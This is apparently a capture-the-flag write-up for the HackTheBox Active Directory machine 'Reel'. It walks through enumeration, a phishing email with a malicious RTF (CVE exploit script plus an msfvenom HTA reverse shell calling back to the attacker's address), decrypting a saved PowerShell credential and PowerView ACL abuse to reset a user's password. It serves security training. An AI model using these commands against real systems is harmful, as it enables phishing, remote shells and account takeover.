---
title: "Reel"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Reel

![](../assets/Pasted%20image%2020250510155623.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.77
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 00:13 CET
Nmap scan report for 10.10.10.77
Host is up (0.043s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-28-18  11:19PM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2024-11-22T23:16:59+00:00
| smb2-time: 
|   date: 2024-11-22T23:16:56
|_  start_date: 2024-11-22T23:05:20
|_clock-skew: mean: 1s, deviation: 2s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 232.76 seconds
```

We enter the `ftp` server with anonymous access and find a note and `.docx` files:

```bash
$ ftp 10.10.10.77
150 Opening ASCII mode data connection.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> prompt off
Interactive mode off.
ftp> mget *
14581 bytes received in 00:00 (162.46 KiB/s)
```

The note says to send a person an `rtf` file and he will convert it, so there is a person that is going to execute `rtf` files.

Using `exiftool` on the files, we find an email address:

```bash
$ exiftool Windows\ Event\ Forwarding.docx 
...
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
...
```

So this person's email is `nico@megabank.com`.

Now we can enumerate the `smtp` service and check if this email is valid:

```bash
$ smtp-user-enum -M RCPT -D megabank.com -u nico -t 10.10.10.77
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ megabank.com

######## Scan started at Sun Nov 24 07:36:58 2024 #########
10.10.10.77: nico@megabank.com exists
######## Scan completed at Sun Nov 24 07:36:58 2024 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)
```

## Initial Access

Let's create a malicious `rtf` and send it to `nico` using the `smtp` server.

Using `searchsploit`, we get an interesting exploit:

![](../assets/Pasted%20image%2020241124073857.png)

Generate the `rtf`:

```bash
$ python2 41894.py -M gen -w yes.rtf -u http://10.10.14.11:8000/bad.hta            
Generating normal RTF payload.

Generated yes.rtf successfully
```

Generate the `hta` with `msfvenom`:

```bash
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.11 lport=443 -f hta-psh -o bad.hta
```

Now, using `sendEmail`, we send the `yes.rtf` to `nico` and create a listener on port `443`:

```bash
$ sendEmail -t nico@megabank.com -u open -m yes -a yes.rtf -s 10.10.10.77 -f paco@megabank.com
Nov 24 08:04:58 kali sendEmail[861336]: Email was sent successfully!
```

Start a listener and a Python server and wait for `nico` to open the mail:

```bash
$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.77] 63152
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\nico>whoami
nico
```

Get the flag:

```shell
C:\Users\nico\Desktop>type user.txt
type user.txt
3d2c48a0d4a7fab39ef9536da3109a84
```

## Privilege Escalation

In the same folder, we have `cred.xml` that shows an XML created with PowerShell `Export-CliXml`:

```bash
C:\Users\nico\Desktop>type cred.xml
type cred.xml                                                                                                                
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">                                                                                                            
    <TN RefId="0">                                                                                                           
      <T>System.Management.Automation.PSCredential</T>                                                                       
      <T>System.Object</T>                                                                                                   
    </TN>                                                                                                                    
    <ToString>System.Management.Automation.PSCredential</ToString>                                                           
    <Props>                                                                                                                  
      <S N="UserName">HTB\Tom</S>                                                                                            
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>       
    </Props>                                                                                                                 
  </Obj>                                                                                                                     
</Objs>            
```

So we get the password in plain text using `clixml`:

```bash
C:\Users\nico\Desktop>powershell -c "$cred=Import-CliXml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred=Import-CliXml -Path .\cred.xml;$pass=$cred.GetNetworkCredential().Password;Write-Output $pass"
UserName    : Tom
Password    : 1ts-mag1c!!!
```

And we have `tom:1ts-mag1c!!!`.

Let's try `ssh`:

```bash
$ sshpass -p '1ts-mag1c!!!' ssh tom@10.10.10.77
Microsoft Windows [Version 6.3.9600]                                                                                         
(c) 2013 Microsoft Corporation. All rights reserved.                                                                         

tom@REEL C:\Users\tom>whoami /priv                                                                                           

PRIVILEGES INFORMATION                                                                                                       
----------------------                                                                                                       

Privilege Name                Description                    State                                                           
============================= ============================== =======                                                         
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                         
SeLoadDriverPrivilege         Load and unload device drivers Enabled                                                         
SeShutdownPrivilege           Shut down the system           Enabled                                                         
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                         
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled    
```

There is a file inside an audit folder:

```bash
$ scp tom@10.10.10.77:'/C:/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv' .
tom@10.10.10.77's password: 
acls.csv
```

Open the file and search for `tom`:

![](../assets/Pasted%20image%2020241124084112.png)

And `tom` has `WriteOwner` permissions over `claire`, so:

The ability to set the object owner is abusable by `Set-DomainObjectOwner`.
The ability to write to the DACL is abusable by `Add-DomainObjectAcl`.
The ability to reset a user’s password is abusable by `Set-DomainUserPassword`.

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1                                                   
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                       
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $pass = ConvertTo-SecureString 'Sup3rS3cr3t!' -AsPlainText -Force               
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $pass
```

Now `ssh` with `claire`:

```bash
$ ssh claire@10.10.10.77
Microsoft Windows [Version 6.3.9600]                                                                                         
(c) 2013 Microsoft Corporation. All rights reserved.                                                                         

claire@REEL C:\Users\claire>whoami
claire
```

`claire` has `writedacl` over `backup_admins` group, so:

```shell
net group backup_admins claire /add
```

Now we can go to the `administrator` folder and there are multiple scripts in the backup scripts folder:

```bash
PS C:\Users\Administrator\Desktop\Backup Scripts> dir | Select-String "Password"                                             

BackupScript.ps1:1:# admin password                                                                                          
BackupScript.ps1:2:$password="Cr4ckMeIfYouC4n!"     
```

Try `administrator` with this password and:

```bash
$ sshpass -p 'Cr4ckMeIfYouC4n!' ssh Administrator@10.10.10.77
Microsoft Windows [Version 6.3.9600]                                                                                         
(c) 2013 Microsoft Corporation. All rights reserved.
```

## Post Exploitation

Get the flag:

```shell
administrator@REEL C:\Users\Administrator>type Desktop\root.txt                                                              
4dbdf359b13068dbccc394fef88b5b82
```
